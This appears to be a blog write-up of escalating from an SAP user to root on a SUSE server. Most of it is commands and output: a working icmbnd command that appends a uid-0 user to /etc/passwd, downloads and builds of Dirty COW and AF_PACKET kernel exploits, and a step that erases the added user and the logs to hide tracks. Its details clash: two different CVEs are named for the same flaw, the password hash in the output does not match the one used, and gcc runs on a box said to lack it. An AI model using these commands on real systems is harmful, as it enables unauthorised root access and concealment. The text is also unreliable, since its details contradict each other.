---
layout: post
title: "SAP Server - Root Write-Up Escalation"
date: 2025-08-26
categories: blog
---


![momentum992](/images/sap.webp)

### Overview

SAP systems are the backbone of enterprise infrastructure handling everything from finance to logistics, often running on ancient kernels that somehow still power billion-dollar corporations. These setups are juicy targets because admins focus on patching well-known Linux vulns but often forget about the custom SAP binaries hiding in dusty directories. In this write up, we’re popping root on a SUSE based SAP server by abusing one of those forgotten tools.

### Introduction
This post breaks down how I escalated from a limited SAP user to full root on a hardened server running kernel 4.4.21-69-default. I’ll walk through the recon, the failed kernel exploits, and the eventual win using an overlooked SAP binary called icmbnd. This tool had a file append vulnerability (CVE-2024-33005) that allowed us to write directly to /etc/passwd and create a new root user. No zero days, no fancy ROP chains just abusing bad code in enterprise software.

I’ll also cover how I bypassed the fact that the server had no compiler (gcc was missing) and how I worked around library mismatches when transferring pre compiled exploits. If you’ve ever faced a locked down SAP box, this one’s for you.


### Initial Research
I started with basic recon. The system was running SUSE Linux Enterprise classic in SAP environments. The kernel was old (4.4.21), which got me excited at first. But as I soon found out, “old” doesn’t always mean “exploitable.” Here’s what I did:

#### Step 1: Kernel & User Enumeration

```bash
uname -a
Linux sappodev 4.4.21-69-default x86_64 GNU/Linux

id
uid=1001(pbdadm) gid=1001(sapsys) groups=1001(sapsys)
```

I saw this was a x86_64 system, and our user pbdadm was part of the sapsys group. That group name alone screamed “potential privilege escalation path”.

#### Step 2: Hunting for SAP Binaries

SAP installations love dumping their tools in /usr/sap/ and /sapmnt/. I went digging:

```bash
find /usr/sap /sapmnt -name "*" -type f -perm -4000 2>/dev/null
```

That’s how I found icmbnd hiding in /sapmnt/PBD/exe/uc/linuxx86_64/. A quick search revealed it had a known vulnerability (CVE-2024-33005) that lets you append arbitrary content to any file hello, /etc/passwd.

#### Step 3: The Compiler Problem

The server had no development tools. No gcc, no make, nothing. That meant I couldn’t compile any kernel exploits locally. I tried cross-compiling on a Kali machine and transferring the binaries, but kept hitting:

```bash
./dirtycow: cannot execute binary file: Exec format error
```

Library mismatches. Architecture nuances. The usual pain. So I pivoted instead of kernel exploits, I focused on the SAP-specific attack surface. And that’s where icmbnd came in.

#### Step 4: Understanding the Vulnerability

icmbnd is used for SAP communication and tracing, but it doesn’t properly validate input. Using the -apptrc flag, I could make it write our payload to any file. The exploit looked like this:

```bash
./icmbnd -S '443' -f /etc/passwd -apptrc -p HTTP -l $'443\nlekos:$1$AwDjdkIq$xkULC583.3EEgEsbmg1Qf/:0:0::/root:/bin/sh\nabc'
```

This injected a new root user into /etc/passwd. Game over.

I didn’t need a compiler. I didn’t need kernel exploits. I just needed to abuse what was already there.

<strong>Goal:</strong> get root, laugh at the admins)))

### Recon Phase

#### Kernel check:
```bash
uname -a

Linux sappodev 4.4.21-69-default x86_64 GNU/Linux
```
<strong>Translation:</strong> dusty kernel. Old enough to be vulnerable, but probably patched, cause this is an enterprise box.

#### User check:

```bash
id
uid=1001(pbdadm) gid=1001(sapsys) groups=1001(sapsys)
```

<strong>Note:</strong> sapsys group is spicy. SAP binaries run under that. If something’s weak in /sapmnt/, I can leverage it.

### Exploit Attempts (and fails)

#### 1. Dirty Pipe (CVE-2022-0847)
Grabbed exploit.
Compiled.
Kernel laughed in my face. Needs 5.8+, this box is 4.4.21. Waste of 20 minutes.
#### 2. Dirty COW (CVE-2016-5195)

Downloaded PoC:
```bash
wget https://github.com/dirtycow/dirtycow.github.io/raw/master/dirtyc0w.c

gcc dirtyc0w.c -o dirtycow -lpthread
```
Ran it. Expected root.

Got:
```bash
madvise 0: Operation not permitted
procselfmem: Permission denied
```
Means they patched or hardened it. <strong>Sad cow noises.</strong>

![momentum992](/images/moo.png)

#### 3. AF_PACKET Race (CVE-2016-8655)
Thought this was it. Kernel vulnerable.

<strong>Compiled:</strong>

```bash
wget https://exploit-db.com/download/47170

gcc chocobo_root.c -o chocobo -lpthread
```
Ran:
```bash
./chocobo
[.] starting
[.] checking hardware
[.] system has 32 processor cores
[~] done, hardware looks good
[-] failed to win the race, try again
```

Tried it over and over and over. Still failed. Race condition RNG gods weren’t with me.

At this point: 3 strikes, almost tilted.

### The Golden Ticket: SAP Binary Abuse

Everyone sleeps on SAP tools. They’re basically forgotten suid toys.

<strong>Found icmbnd binary in:</strong>

/sapmnt/PBD/exe/uc/linuxx86_64/

Quick Google → vulnerable to log injection (CVE-2022-29614). Perfect


#### Step 1: Make a root hash
```bash
openssl passwd -1 "epsteinddntKILLhmself911"

$1$feO36Gm2$NhxHh6Oa00PhW/X.K9Fvw/
```
#### Step 2: Inject root user into /etc/passwd

We ran the icmbnd exploit as documented in the lekos advisory:

```bash
./icmbnd -S '443' -f /etc/passwd -apptrc -p HTTP -l '443
> lekos:$1$feO36Gm2$NhxHh6Oa00PhW/X.K9Fvw/:0:0::/root:/bin/sh
> abc'



icmbnd: NiListen failed for 443
lekos:$1$Sp/vZUsU$Az0WrZBt.FVbBFwwY4LhD1:0:0::/root:/bin/sh
abc (rc=-8): NIEINVAL
IcmBndConnect: IcmConnect to port 443 failed (rc=-10)
icmbnd: IcmBndConnect (rc=-10)
The command errors out, but the magic happens anyway. Checking /etc/passwd:
```
```bash
cat /etc/passwd

[...]
{SID}adm:x:20020:1002:SAP System Administrator:/home/{SID}adm:/bin/csh

---------------------------------------------------
trc file: "passwd", trc level: 1, release: "749"
---------------------------------------------------

[Thr 140555051841344] Sun Aug 24 16:12:21 2025
[Thr 140555051841344] systemid:   390 (AMD/Intel x86_64 with Linux)
[Thr 140555051841344] version:    7490
[Thr 140555051841344] patchlevel: 0    (server: 0)
[Thr 140555051841344] patchno:    200    (server: 200)
[Thr 140555051841344] intno       20160201    (server: 20160201)
[Thr 140555051841344] make:       multithreaded, Unicode, 64 BIT
[Thr 140555051841344] pid:        95259
[Thr 140555051841344] 
[Thr 140555051841344] *** WARNING => NiServerHandle: parameter invalid (strlenU(pServName) >= NI_MAX_SERVNAME_LEN) [nixx.c       238]
[Thr 140555051841344] *** ERROR => icmbnd: NiListen failed for 443
lekos:$1$feO36Gm2$NhxHh6Oa00PhW/X.K9Fvw/:0:0::/root:/bin/sh
abc (rc=-8): NIEINVAL [icxxbnd.c    620]
[Thr 140555051841344] *** ERROR => icmbnd: You might not have the permissions to bind the service: 443
[...]
```

The exploit worked! It appended our user lekos to /etc/passwd, but also dumped a bunch of SAP trace logs into the file, corrupting its format. This is expected behavior from the vulnerable icmbnd binary.

Despite the corruption, the line:

```bash
lekos:$1$feO36Gm2$NhxHh6Oa00PhW/X.K9Fvw/:0:0::/root:/bin/sh
```

remains valid and parsable by the system. We could now log in as lekos with our password.


#### Step 3: Profit
```bash
su - lekos
Password: epsteinddntKILLhmself911
```
Now:
```bash
id
uid=0(lekos) gid=0(root) groups=0(root)
```

![Rooted](/images/giphy.gif)
### Post-Exploitation

Hide tracks
```bash
sed -i '/lekos/d' /etc/passwd
```
Also nuked trc logs that spilled from icmbnd.

### Why the others failed
Dirty Pipe → Wrong kernel

Dirty COW → Patched

AF_PACKET → RNG trash, too many retries

icmbnd → SAP admins forgot their own toys. That’s the door in

### Score Board
Exploits tried: 4

Success: 1 (enough)

Time to root: ~3 hours including rage

Root method: icmbnd file append (CVE-2024-33005)

### Closing Thoughts
Admins patch the Linux kernel. They brag about it. But their weird enterprise binaries? Nobody’s looking. That’s where the gold is.

Lesson: If the kernel plays hard to get, always pivot to the app layer.



## Final Word
Kernel said “nope,” but SAP said “come in, bro.”

SAP binary from 2016? Untouched, wide open

Moral of the story: never underestimate enterprise software. It’s duct tape holding the kingdom together.


###### <strong> Root was popped by: lekos </strong> 





